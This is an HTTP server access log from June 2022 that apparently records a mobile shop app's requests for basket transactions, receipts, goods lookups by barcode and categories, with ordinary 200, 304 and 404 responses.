::ffff:127.0.0.1 - - [28/Jun/2022:07:03:18 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 406 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:03:18 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 406 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:03:28 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:03:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:03:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:04:10 +0000] "GET /api/v1/goods/user?barCode=9787566005694 HTTP/1.0" 200 833 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:04:31 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:04:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 405 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:04:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 405 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:04:41 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:04:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:04:43 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:04:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 2473 "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:04:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 2473 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:04:53 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:04:58 +0000] "GET /api/v1/goods/62baa6635b4c7dacd78caa25 HTTP/1.0" 200 382 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:04:58 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "Dalvik/2.1.0 (Linux; U; Android 10; SM-A202K Build/QP1A.190711.020)"
::1 - - [28/Jun/2022:07:04:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:05:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:05:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:05:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:07:05:57 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:07:05:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:07:06:00 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:06:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:06:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:06:01 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:07:06:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:07:06:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:07:06:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:06:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:06:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:06:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:06:59 +0000] "GET /api/v1/goods/user?barCode=9787566005694 HTTP/1.0" 200 833 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:08:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:07:08:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:07:08:03 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:07:08:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [28/Jun/2022:07:08:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [28/Jun/2022:07:09:19 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [28/Jun/2022:07:09:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [28/Jun/2022:07:09:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
